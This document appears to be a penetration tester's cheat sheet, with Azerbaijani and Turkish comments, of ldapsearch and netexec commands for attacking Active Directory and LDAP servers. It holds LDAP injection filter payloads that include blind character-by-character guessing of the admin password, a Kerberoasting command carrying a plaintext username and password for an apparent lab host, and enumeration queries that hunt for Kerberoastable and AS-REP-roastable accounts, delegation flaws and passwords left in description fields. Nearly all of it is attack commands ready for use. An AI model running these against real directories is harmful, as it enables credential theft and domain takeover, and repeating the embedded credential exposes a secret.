# Enumeration
```powershell
ldapsearch -x -H ldap://DC-IP/ -s base

ldapsearch -x -H ldap://DC-IP/ -s base namingcontexts

ldapsearch -x -H ldap://DC-IP/ -s base supportedsaslmechanisms

ldapsearch -x -H ldap://192.168.0.239 -s base subschemaSubentry

ldapsearch -x -H ldap://<DC_IP> -b "DC=domain,DC=local"

ldapsearch -x -H ldap://<DC_IP> -D "user@domain.local" -w "password" -b "DC=domain,DC=local"

ldapsearch -x -H ldap://<DC_IP> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
```

# Kerberoasting
```powershell
nxc ldap 10.129.18.236 fluffy.htb -u j.fleischman -p J0elTHEM4n1990! --kerberoasting output.txt
```

# LDAP Injection
```powershell
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "" -s base "(objectClass=*)"

ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(uid=*)"

ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(uid=admin*)" 
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(|(uid=admin*))"

ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" ")(uid=*))(|(uid=*"
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "*)(uid=*))(|(uid=*"

ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(uid=a*)" 2>/dev/null
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(uid=b*)" 2>/dev/null

ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(&(uid=admin)(userPassword=a*))" 2>/dev/null
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(&(uid=admin)(userPassword=b*))" 2>/dev/null

ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(objectClass=*)" +
ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(cn=*)" "*"

ldapsearch -x -H "ldap://hedef-sunucu:389" -b "dc=hedef,dc=com" "(description=*)" 
ldapsearch -x -H "ldef-sunucu:389" -b "dc=hedef,dc=com" "(description=*)(|(cn=*))"
```

# LDAP Enumeration
```powershell
# Domain info
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b $BASE "(objectClass=domain)" dc,distinguishedName

# Bütün userlər
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b $BASE "(objectClass=user)" sAMAccountName,memberOf,description

# Bütün qruplar
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b $BASE "(objectClass=group)" sAMAccountName,member

# Bütün computerlər
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b $BASE "(objectClass=computer)" sAMAccountName,operatingSystem

# Konkret user
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b $BASE "(sAMAccountName=administrator)" *

# Description-da şifrə axtarışı
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b $BASE "(description=*pass*)" sAMAccountName,description

# Kerberoastable userlər
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b $BASE "(&(objectClass=user)(servicePrincipalName=*)(!samAccountName=krbtgt))" sAMAccountName,servicePrincipalName

# ASREPRoastable userlər
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b $BASE "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Domain Admins üzvləri
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b "CN=Domain Admins,CN=Users,$BASE" "(objectClass=group)" member

# RBCD atributu olan computerlər
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b $BASE "(objectClass=computer)" msDS-AllowedToActOnBehalfOfOtherIdentity,sAMAccountName

# Unconstrained delegation
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b $BASE "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName

# Constrained delegation
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b $BASE "(msDS-AllowedToDelegateTo=*)" sAMAccountName,msDS-AllowedToDelegateTo

# Silinmiş bütün obyektlər (Recycle Bin)
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b "CN=Deleted Objects,$BASE" -E '!1.2.840.113556.1.4.417' "(objectClass=*)" sAMAccountName,distinguishedName

# Silinmiş yalnız userlər
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b "CN=Deleted Objects,$BASE" -E '!1.2.840.113556.1.4.417' "(&(isDeleted=TRUE)(objectClass=user))" sAMAccountName,distinguishedName

# Domain Controllers
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b $BASE "(userAccountControl:1.2.840.113556.1.4.803:=8192)" sAMAccountName,operatingSystem

# GPO-lar
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b $BASE "(objectClass=groupPolicyContainer)" displayName,gPCFileSysPath

# Trust-lar
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b $BASE "(objectClass=trustedDomain)" trustPartner,trustDirection

# Password Policy
ldapsearch -H ldap://$HOST -D $USER -w $PASS -b $BASE "(objectClass=domain)" minPwdLength,pwdHistoryLength,lockoutThreshold
```
